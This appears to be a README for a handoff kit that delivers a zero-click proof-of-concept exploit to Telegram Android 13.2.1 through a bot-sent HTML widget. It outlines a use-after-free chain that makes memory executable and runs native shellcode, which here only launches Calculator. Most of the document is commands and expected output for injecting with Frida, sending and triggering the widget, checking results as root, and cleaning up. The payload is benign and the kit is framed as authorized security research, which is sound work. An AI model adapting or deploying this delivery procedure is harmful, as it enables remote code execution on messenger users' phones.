# Telegram Android Calculator widget PoC kit

Colleague handoff package for the exact Telegram widget HTML requested by
SHA-256. The package follows the same layout as the C3 colleague archive:
configuration template, demo, local harness, payloads, active Android tooling,
skill instructions, wrapper script, and a complete checksum manifest.

## Bundled PoC identity

- File: `payloads/await-using-telegram-calc.html`
- SHA-256: `6630b003766baed1fa86cea880d22e41dc416f63d800de3246941ede2396ad48`
- Raw size: 8,869 bytes
- zlib-9 size: 4,094 bytes
- Telegram limits enforced by the sender: 32,768 raw bytes and 4,096 zlib bytes

- Companion artifact: `payloads/telegram-calc-shellcode-jni.json`
- Companion SHA-256: `23f366ed04438039d55ce0b37c554b0f4b32d8bbdd6149c4d32c2baf8964e5c2`

Both files were copied directly from
`build-arm64/telegram-android-calc/`; the demo was copied directly from the
repository's `poc.mp4`. No C3 payload or Windows Calculator payload from the
reference archive is included.

The two-byte compressed-size margin is intentional. Do not edit, wrap,
reformat, or minify the HTML before delivery. `send-calc-widget.sh` refuses to
send if the exact SHA-256 changes.

The HTML is self-contained. It displays the V12 countdown, exercises the
`await using` stale-`JSVarRef` chain, derives the Telegram ARM64 module base,
changes the controlled buffer mapping to executable, and launches the stock
Android Calculator through JNI. Its embedded native stage writes these
app-private markers:

- `/data/user/0/org.telegram.messenger/cache/telegram_calc_shellcode`:
  `TG_CALC_EXEC_OK`
- `/data/user/0/org.telegram.messenger/cache/telegram_calc_launched`:
  `CALC_STARTED`
- `/data/user/0/org.telegram.messenger/cache/telegram_calc_status`: created
  only on a native/JNI failure path

## Safety scope

Use only a dedicated bot, an authorized device, and the tester's own private
chat. Never send the payload to a group, channel, third party, or shared test
account. Delete the widget message immediately after the run.

No credentials are bundled. Keep the bot token and private-chat ID outside the
extracted package in a mode-0600 file. Rotate the bot token when collaboration
ends.

## Pinned target

The embedded RVAs and object layouts are build-specific:

- Telegram package: `org.telegram.messenger`
- Reference version: 13.2.1, `versionCode 72911`
- ABI: ARM64
- Native library: `libtmessages.49.so`
- Reference Build ID: `1c52ec7a526ed8d55c00f763261fbdc9929d0931`
- Reference native SHA-256:
  `01566203c5d4d72a8383d19743c976fada0542a58a80f5bef1b339e5ad9f463a`

Do not reuse this payload against another build. Capture the installed target
with `tools/collect_target.py` and compare its version, ABI, build ID, and
native-library hash before interpreting a result.

## Package contents

- `payloads/await-using-telegram-calc.html`: exact requested terminal PoC
- `payloads/telegram-calc-shellcode-jni.json`: matching embedded ARM64 stage artifact
- `send-calc-widget.sh`: identity check, size validation, and private-chat send
- `tools/send_widget.py`: private-chat-only Bot API sender and cleanup utility
- `tools/inject_widget.py`: authorized-device local widget injector and tracer
- `tools/collect_target.py`: installed-build and native-library collector
- `harness/sbx.c`: local QuickJS harness with widget limits
- `payloads/probe.html`: benign visible widget probe
- `payloads/debug-template.html`: visible logging template
- `demo/telegram-android-calculator-poc.mp4`: reference UI demonstration
- `SHA256SUMS.txt`: package file identities, excluding the manifest itself

Root and `frida-server` binaries are intentionally not bundled because they
must match the tester's Android build and host Frida version.

## 1. Host setup

```sh
cd telegram-widget-android-calc-colleague-package
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
adb devices
```

For local injection, start the matching ARM64 `frida-server` on the authorized
rooted device. The bundled tooling is pinned to Frida 17.22.1.

## 2. Verify the extracted package

From the package root:

```sh
shasum -a 256 -c SHA256SUMS.txt
./send-calc-widget.sh --dry-run
```

Expected payload inspection:

```text
html_bytes: 8869
zlib9_bytes: 4094
html_sha256: 6630b003766baed1fa86cea880d22e41dc416f63d800de3246941ede2396ad48
```

The sender prints the inspection as JSON. Any hash or size difference is a
hard failure.

## 3. Capture the exact Android target

```sh
python3 tools/collect_target.py --serial YOUR_SERIAL \
  > /tmp/telegram-android-calc-target.json
```

Keep that JSON with the run evidence. Start Telegram before collection if the
loaded-library mapping and hash are required.

## 4. Optional active local injection

This path is for an authorized rooted lab device with matching Frida client and
server versions. The injector force-stops Telegram, isolates its UID from the
network by default, starts the app, constructs the widget, records native
creation and paint events, and cleans up its firewall rules.

```sh
python3 tools/inject_widget.py \
  --serial YOUR_SERIAL \
  --html payloads/await-using-telegram-calc.html \
  --expect-text BOOM \
  --root-command 'su -c'
```

Use the device's actual root interface. The default is
`/data/local/tmp/ksud shell`; omit `--root-command` when that is correct.
Local injection proves sandbox reachability and instrumentation output, not the
normal server-delivery path.

## 5. Configure an owned private bot

```sh
install -d -m 700 "$HOME/.config/widget-sandbox"
cp config/telegram.env.example \
  "$HOME/.config/widget-sandbox/telegram-live-test.env"
chmod 600 "$HOME/.config/widget-sandbox/telegram-live-test.env"
$EDITOR "$HOME/.config/widget-sandbox/telegram-live-test.env"
```

Set:

```text
TG_BOT_TOKEN=<dedicated bot token>
TG_BOT_CHAT_ID=<numeric id of the tester's own private user chat>
```

Open the bot's private chat and send `/start`. If the chat ID is unknown:

```sh
python3 tools/send_widget.py discover --save-single
python3 tools/send_widget.py check
```

The sender validates Telegram's server-reported chat type and refuses groups
and channels. It never prints the bot token.

## 6. Deliver and trigger

Stop Frida for the normal-path proof, verify Telegram is connected, then run:

```sh
adb shell 'pidof frida-server || true'
./send-calc-widget.sh
```

The first command must print no Frida PID. The wrapper rechecks the exact HTML
hash and compressed size before calling `sendWidget` with
`--confirm-own-private-chat`.

Open the resulting private bot chat and scroll the widget into view. No click
inside the widget is required. The countdown reaches `BOOM`; on the pinned
vulnerable build, Calculator opens.

## 7. Verify

On the authorized rooted device:

```sh
adb shell 'dumpsys activity activities | grep -m1 topResumedActivity'
adb shell "/data/local/tmp/ksud shell 'cat /data/user/0/org.telegram.messenger/cache/telegram_calc_shellcode'"
adb shell "/data/local/tmp/ksud shell 'cat /data/user/0/org.telegram.messenger/cache/telegram_calc_launched'"
adb shell "/data/local/tmp/ksud shell 'cat /data/user/0/org.telegram.messenger/cache/telegram_calc_status 2>/dev/null || true'"
adb shell 'pidof frida-server || true'
```

Expected result:

```text
topResumedActivity=... com.google.android.calculator/com.android.calculator2.Calculator ...
TG_CALC_EXEC_OK
CALC_STARTED
<no failure-status output>
<no frida-server PID>
```

Replace `/data/local/tmp/ksud shell` with the device's actual root command when
needed.

## 8. Cleanup

```sh
python3 tools/send_widget.py delete
adb shell "/data/local/tmp/ksud shell 'unlink /data/user/0/org.telegram.messenger/cache/telegram_calc_shellcode 2>/dev/null || true; unlink /data/user/0/org.telegram.messenger/cache/telegram_calc_launched 2>/dev/null || true; unlink /data/user/0/org.telegram.messenger/cache/telegram_calc_status 2>/dev/null || true'"
```

Confirm the widget message is gone, no package-added firewall rule remains,
and rotate the dedicated bot token when the handoff window ends.
